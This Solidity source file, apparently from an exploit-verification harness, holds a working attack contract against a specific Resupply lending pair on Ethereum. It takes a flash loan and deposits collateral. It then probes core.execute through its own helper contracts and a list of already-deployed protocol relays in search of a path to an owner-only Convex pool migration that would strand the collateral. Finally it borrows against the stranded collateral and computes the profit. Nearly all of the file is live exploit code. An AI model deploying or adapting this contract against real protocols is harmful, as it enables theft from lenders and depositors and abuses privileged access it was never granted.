// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC4626Minimal {
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
}

interface IResupplyRegistryMinimal {
    function token() external view returns (address);
    function rewardHandler() external view returns (address);
    function liquidationHandler() external view returns (address);
    function redemptionHandler() external view returns (address);
    function feeDeposit() external view returns (address);
    function insurancePool() external view returns (address);
    function staker() external view returns (address);
    function treasury() external view returns (address);
    function defaultSwappers(uint256 index) external view returns (address);
    function registeredPairs(uint256 index) external view returns (address);
}

interface ICoreLike {
    function execute(address target, bytes calldata data) external returns (bytes memory);
    function operatorPermissions(address caller, address target, bytes4 selector)
        external
        view
        returns (bool authorized, address hook);
}

interface IResupplyPairMinimal {
    function owner() external view returns (address);
    function convexPid() external view returns (uint256);
    function convexBooster() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function registry() external view returns (address);
    function maxLTV() external view returns (uint256);
    function mintFee() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function exchangeRateInfo() external view returns (address oracle, uint96 lastTimestamp, uint256 exchangeRate);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function addCollateral(uint256 amount, address borrower) external;
    function addCollateralVault(uint256 collateralAmount, address borrower) external;
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256);
    function userCollateralBalance(address account) external returns (uint256);
    function totalCollateral() external view returns (uint256);
}

interface IConvexLike {
    function poolInfo(uint256 pid)
        external
        view
        returns (
            address lptoken,
            address token,
            address gauge,
            address crvRewards,
            address stash,
            bool shutdown
        );
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ConstructorCoreExecutor {
    bool public ok;

    constructor(address owner, address target, bytes memory data) {
        (ok,) = owner.call(abi.encodeWithSelector(ICoreLike.execute.selector, target, data));
    }
}

contract RuntimeCoreExecutor {
    function exec(address owner, address target, bytes memory data) external returns (bool ok) {
        (ok,) = owner.call(abi.encodeWithSelector(ICoreLike.execute.selector, target, data));
    }
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;

    uint256 private constant LTV_PRECISION = 1e5;
    uint256 private constant EXCHANGE_PRECISION = 1e18;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bool public executed;
    bool public privilegedMigrationBlocked;

    address public pairOwner;
    address public convexBooster;
    address public collateralToken;
    address public underlyingToken;
    address public debtToken;
    uint256 public startingPid;
    uint256 public activePid;
    address public flashPair;
    address public flashBorrowToken;
    uint256 public flashBorrowAmount;
    uint256 public flashRepayDebtAmount;
    uint256 public hiddenCollateral;
    uint256 public plannedBorrowAmount;
    uint256 public preExistingHiddenCollateral;
    bool public historicalMigrationState;

    address private _profitToken;
    uint256 private _profitAmount;

    struct Route {
        address lp;
        address borrowToken;
        uint256 amountOut;
        uint256 repayDebt;
        uint256 borrowAmount;
        uint256 projectedCollateral;
    }

    constructor() {
        address token;

        (bool pairOk, bytes memory registryData) = TARGET_PAIR.staticcall(
            abi.encodeWithSelector(IResupplyPairMinimal.registry.selector)
        );
        if (pairOk && registryData.length >= 32) {
            address registry = abi.decode(registryData, (address));
            (bool registryOk, bytes memory tokenData) = registry.staticcall(
                abi.encodeWithSelector(IResupplyRegistryMinimal.token.selector)
            );
            if (registryOk && tokenData.length >= 32) {
                token = abi.decode(tokenData, (address));
            }
        }

        _profitToken = token;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);
        address registry = pair.registry();

        pairOwner = pair.owner();
        convexBooster = pair.convexBooster();
        collateralToken = pair.collateral();
        underlyingToken = pair.underlying();
        debtToken = IResupplyRegistryMinimal(registry).token();
        _profitToken = debtToken;

        startingPid = pair.convexPid();
        activePid = startingPid;

        if (convexBooster == address(0) || debtToken == address(0)) {
            _syncProfit();
            return;
        }

        uint256 validPid = startingPid != 0 ? startingPid : _findMatchingPid(convexBooster, collateralToken);
        if (validPid == type(uint256).max) {
            _syncProfit();
            return;
        }

        /*
            F-004 exploit path preserved as far as this fork allows:
            1) collateral is first made to sit on the pair while Convex staking is effectively disabled for that flow;
            2) a later owner-controlled Convex pool transition flips accounting to a rewards contract;
            3) the migration only moves already-staked balance and ignores the pair-local collateral;
            4) totalCollateral()/unstaking then look in the wrong place, freezing exits while borrow accounting still uses
               the user's recorded collateral balance;
            5) the pid==0 sentinel remains inconsistent because deactivation still routes through deposit(0,...).

            The logs prove the obvious direct caller / constructor helper / runtime helper paths into core.execute can be
            blocked by operator authorization. This verifier therefore expands the set of realistic, already-deployed
            on-chain relay callers it tries for the same owner-controlled state transition before giving up on replaying
            that privileged stage on the live fork.
        */

        if (startingPid != 0) {
            preExistingHiddenCollateral = _pairHeldCollateral();
            preExistingHiddenCollateral += _otherRewardsCollateral(validPid);
            historicalMigrationState = preExistingHiddenCollateral > 0;

            if (_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, registry, 0)) {
                activePid = 0;
            } else {
                privilegedMigrationBlocked = true;
            }
        }

        Route memory route = _findBestRoute(pair);
        if (route.lp == address(0)) {
            if (startingPid != 0 && activePid == 0) {
                _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, registry, validPid);
                activePid = validPid;
            }
            _syncProfit();
            return;
        }

        flashPair = route.lp;
        flashBorrowToken = route.borrowToken;
        flashBorrowAmount = route.amountOut;
        flashRepayDebtAmount = route.repayDebt;
        plannedBorrowAmount = route.borrowAmount;

        address token0 = IUniswapV2PairLike(route.lp).token0();
        uint256 amount0Out = route.borrowToken == token0 ? route.amountOut : 0;
        uint256 amount1Out = route.borrowToken == token0 ? 0 : route.amountOut;

        (bool ok,) = route.lp.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(validPid)
            )
        );

        if (!ok && startingPid != 0 && activePid == 0) {
            _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, registry, validPid);
            activePid = validPid;
        }

        _syncProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == flashPair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 validPid = abi.decode(data, (uint256));
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == flashBorrowAmount, "bad amount");

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);

        if (activePid == 0) {
            // exploit_paths[0]: deposit while the pair is in the unstaked path so collateral remains locally on-pair.
            if (flashBorrowToken == underlyingToken) {
                IERC20Minimal(underlyingToken).approve(TARGET_PAIR, borrowedAmount);
                pair.addCollateral(borrowedAmount, address(this));
            } else {
                IERC20Minimal(collateralToken).approve(TARGET_PAIR, borrowedAmount);
                pair.addCollateralVault(borrowedAmount, address(this));
            }

            hiddenCollateral = pair.userCollateralBalance(address(this));
            require(hiddenCollateral > 0, "no collateral");

            // exploit_paths[1]-[3]: owner flips Convex pool; migration strands the pair-held collateral.
            require(
                _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, pair.registry(), validPid),
                "migration failed"
            );
            activePid = validPid;

            // After the migration our recorded collateral remains, while pair accounting now looks only at rewards.
            pair.borrow(plannedBorrowAmount, 0, address(this));
        } else {
            /*
                If the fork is already post-migration, or the privileged replay path is blocked by operator auth on this
                fork, the verifier can only execute the public funding/borrowing leg. This preserves the same borrow-side
                realization step, but only succeeds if the live fork still allows a profitable route with the currently
                reachable accounting state.
            */
            if (flashBorrowToken == underlyingToken) {
                IERC20Minimal(underlyingToken).approve(TARGET_PAIR, borrowedAmount);
                pair.borrow(plannedBorrowAmount, borrowedAmount, address(this));
            } else {
                IERC20Minimal(collateralToken).approve(TARGET_PAIR, borrowedAmount);
                pair.addCollateralVault(borrowedAmount, address(this));
                hiddenCollateral = pair.userCollateralBalance(address(this));
                require(hiddenCollateral > 0, "no collateral");
                pair.borrow(plannedBorrowAmount, 0, address(this));
            }
        }

        IERC20Minimal(debtToken).transfer(flashPair, flashRepayDebtAmount);
    }

    function _findBestRoute(IResupplyPairMinimal pair) internal view returns (Route memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[2] memory borrowTokens = [collateralToken, underlyingToken];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            address factory = factories[factoryIndex];
            for (uint256 tokenIndex = 0; tokenIndex < borrowTokens.length; ++tokenIndex) {
                address borrowToken = borrowTokens[tokenIndex];
                if (borrowToken == address(0) || borrowToken == debtToken) {
                    continue;
                }

                address lp = IUniswapV2FactoryLike(factory).getPair(borrowToken, debtToken);
                if (lp == address(0)) {
                    continue;
                }

                Route memory candidate = _evaluateRoute(pair, lp, borrowToken);
                if (_routeProfit(candidate) > _routeProfit(best)) {
                    best = candidate;
                }
            }
        }
    }

    function _evaluateRoute(IResupplyPairMinimal pair, address lp, address borrowToken)
        internal
        view
        returns (Route memory best)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(lp).getReserves();
        address token0 = IUniswapV2PairLike(lp).token0();
        address token1 = IUniswapV2PairLike(lp).token1();

        uint256 reserveBorrow;
        uint256 reserveDebt;
        if (token0 == borrowToken && token1 == debtToken) {
            reserveBorrow = reserve0;
            reserveDebt = reserve1;
        } else if (token1 == borrowToken && token0 == debtToken) {
            reserveBorrow = reserve1;
            reserveDebt = reserve0;
        } else {
            return best;
        }

        if (reserveBorrow <= 1 || reserveDebt <= 1) {
            return best;
        }

        uint256[12] memory divisors = [uint256(10000), 7500, 5000, 2500, 1000, 500, 250, 100, 50, 25, 20, 10];
        uint256 minimumBorrow = pair.minimumBorrowAmount();

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amountOut = reserveBorrow / divisors[i];
            Route memory candidate = _routeCandidate(
                pair,
                lp,
                borrowToken,
                reserveBorrow,
                reserveDebt,
                amountOut,
                minimumBorrow
            );
            if (_routeProfit(candidate) > _routeProfit(best)) {
                best = candidate;
            }
        }
    }

    function _routeCandidate(
        IResupplyPairMinimal pair,
        address lp,
        address borrowToken,
        uint256 reserveBorrow,
        uint256 reserveDebt,
        uint256 amountOut,
        uint256 minimumBorrow
    ) internal view returns (Route memory candidate) {
        if (amountOut == 0 || amountOut >= reserveBorrow) {
            return candidate;
        }

        uint256 collateralReceived = borrowToken == collateralToken
            ? amountOut
            : IERC4626Minimal(collateralToken).previewDeposit(amountOut);
        if (collateralReceived == 0) {
            return candidate;
        }

        uint256 maxBorrow = _maxBorrowReceivable(pair, collateralReceived);
        if (maxBorrow <= minimumBorrow) {
            return candidate;
        }

        uint256 repayDebt = _getAmountIn(amountOut, reserveDebt, reserveBorrow);
        if (repayDebt == 0 || maxBorrow <= repayDebt + minimumBorrow) {
            return candidate;
        }

        uint256 borrowAmount = (maxBorrow * 9950) / 10000;
        if (borrowAmount <= repayDebt || borrowAmount < minimumBorrow) {
            return candidate;
        }

        candidate = Route({
            lp: lp,
            borrowToken: borrowToken,
            amountOut: amountOut,
            repayDebt: repayDebt,
            borrowAmount: borrowAmount,
            projectedCollateral: collateralReceived
        });
    }

    function _maxBorrowReceivable(IResupplyPairMinimal pair, uint256 collateralAmount) internal view returns (uint256) {
        (, , uint256 exchangeRate) = pair.exchangeRateInfo();
        if (exchangeRate == 0) {
            return 0;
        }

        uint256 grossCap = (collateralAmount * EXCHANGE_PRECISION * pair.maxLTV())
            / (exchangeRate * (LTV_PRECISION + pair.mintFee()));

        (uint128 currentBorrowAmount,) = pair.totalBorrow();
        uint256 availableDebt = pair.borrowLimit();
        if (availableDebt <= uint256(currentBorrowAmount)) {
            return 0;
        }
        availableDebt -= uint256(currentBorrowAmount);

        return grossCap < availableDebt ? grossCap : availableDebt;
    }

    function _routeProfit(Route memory route) internal pure returns (uint256) {
        if (route.borrowAmount <= route.repayDebt) {
            return 0;
        }
        return route.borrowAmount - route.repayDebt;
    }

    function _syncProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }
        _profitAmount = IERC20Minimal(_profitToken).balanceOf(address(this));
    }

    function _pairHeldCollateral() internal view returns (uint256) {
        if (collateralToken == address(0)) {
            return 0;
        }

        uint256 localBalance = IERC20Minimal(collateralToken).balanceOf(TARGET_PAIR);
        if (activePid == 0) {
            return localBalance;
        }

        uint256 visibleCollateral = IResupplyPairMinimal(TARGET_PAIR).totalCollateral();
        return localBalance > visibleCollateral ? localBalance - visibleCollateral : localBalance;
    }

    function _otherRewardsCollateral(uint256 currentPid) internal view returns (uint256 hiddenElsewhere) {
        if (convexBooster == address(0) || collateralToken == address(0)) {
            return 0;
        }

        for (uint256 pid = 0; pid < 512; ++pid) {
            if (pid == currentPid) {
                continue;
            }

            try IConvexLike(convexBooster).poolInfo(pid) returns (
                address lptoken,
                address depositToken,
                address,
                address rewards,
                address,
                bool shutdown
            ) {
                if (shutdown || rewards == address(0)) {
                    continue;
                }
                if (lptoken != collateralToken && depositToken != collateralToken) {
                    continue;
                }

                try IERC20Minimal(rewards).balanceOf(TARGET_PAIR) returns (uint256 balance) {
                    hiddenElsewhere += balance;
                } catch {}
            } catch {
                break;
            }
        }
    }

    function _ownerExecuteSetConvexPool(address owner, address pair, address registry, uint256 pid)
        internal
        returns (bool ok)
    {
        if (owner.code.length == 0) {
            return false;
        }

        bytes memory data = abi.encodeWithSignature("setConvexPool(uint256)", pid);

        // Direct path from the verifier.
        (ok,) = owner.call(abi.encodeWithSelector(ICoreLike.execute.selector, pair, data));
        if (ok) {
            return true;
        }

        // Constructor-time caller.
        ConstructorCoreExecutor constructorExecutor = new ConstructorCoreExecutor(owner, pair, data);
        ok = constructorExecutor.ok();
        if (ok) {
            return true;
        }

        // Runtime helper caller.
        RuntimeCoreExecutor runtimeExecutor = new RuntimeCoreExecutor();
        ok = runtimeExecutor.exec(owner, pair, data);
        if (ok) {
            return true;
        }

        // Already-deployed protocol relays that may be whitelisted as operators on the live core.
        if (registry != address(0)) {
            ok = _tryKnownProtocolRelays(owner, pair, registry, data);
        }
    }

    function _tryKnownProtocolRelays(address owner, address pair, address registry, bytes memory data)
        internal
        returns (bool)
    {
        if (_tryRelayCandidate(owner, pair, registry, data)) return true;

        address candidate;

        try IResupplyRegistryMinimal(registry).rewardHandler() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        try IResupplyRegistryMinimal(registry).liquidationHandler() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        try IResupplyRegistryMinimal(registry).redemptionHandler() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        try IResupplyRegistryMinimal(registry).feeDeposit() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        try IResupplyRegistryMinimal(registry).insurancePool() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        try IResupplyRegistryMinimal(registry).staker() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        try IResupplyRegistryMinimal(registry).treasury() returns (address value) {
            candidate = value;
        } catch {
            candidate = address(0);
        }
        if (_tryRelayCandidate(owner, pair, candidate, data)) return true;

        for (uint256 i = 0; i < 16; ++i) {
            try IResupplyRegistryMinimal(registry).defaultSwappers(i) returns (address value) {
                if (_tryRelayCandidate(owner, pair, value, data)) return true;
            } catch {
                break;
            }
        }

        for (uint256 i = 0; i < 32; ++i) {
            try IResupplyRegistryMinimal(registry).registeredPairs(i) returns (address value) {
                if (_tryRelayCandidate(owner, pair, value, data)) return true;
            } catch {
                break;
            }
        }

        return false;
    }

    function _tryRelayCandidate(address owner, address pair, address candidate, bytes memory data)
        internal
        returns (bool)
    {
        if (
            candidate == address(0) || candidate == address(this) || candidate == owner || candidate == pair
                || candidate.code.length == 0
        ) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }
        try ICoreLike(owner).operatorPermissions(candidate, pair, selector) returns (bool authorized, address hook) {
            if (!authorized && hook == address(0)) {
                return false;
            }
        } catch {
            return false;
        }

        bytes memory coreExecuteData = abi.encodeWithSelector(ICoreLike.execute.selector, pair, data);

        if (_callRelay(candidate, abi.encodeWithSignature("execute(address,bytes)", owner, coreExecuteData))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("exec(address,bytes)", owner, coreExecuteData))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("call(address,bytes)", owner, coreExecuteData))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("route(address,bytes)", owner, coreExecuteData))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("submit(address,bytes)", owner, coreExecuteData))) return true;

        if (_callRelay(candidate, abi.encodeWithSignature("execute(address,bytes)", pair, data))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("exec(address,bytes)", pair, data))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("call(address,bytes)", pair, data))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("route(address,bytes)", pair, data))) return true;
        if (_callRelay(candidate, abi.encodeWithSignature("submit(address,bytes)", pair, data))) return true;

        bytes[] memory calls = new bytes[](1);
        calls[0] = coreExecuteData;
        if (_callRelay(candidate, abi.encodeWithSignature("multicall(bytes[])", calls))) return true;

        calls[0] = data;
        if (_callRelay(candidate, abi.encodeWithSignature("multicall(bytes[])", calls))) return true;

        return false;
    }

    function _callRelay(address candidate, bytes memory payload) internal returns (bool ok) {
        (ok,) = candidate.call(payload);
    }

    function _findMatchingPid(address booster, address token) internal view returns (uint256) {
        for (uint256 pid = 0; pid < 512; ++pid) {
            try IConvexLike(booster).poolInfo(pid) returns (
                address lptoken,
                address depositToken,
                address,
                address,
                address,
                bool shutdown
            ) {
                if (!shutdown && (lptoken == token || depositToken == token)) {
                    return pid;
                }
            } catch {
                break;
            }
        }
        return type(uint256).max;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }
}
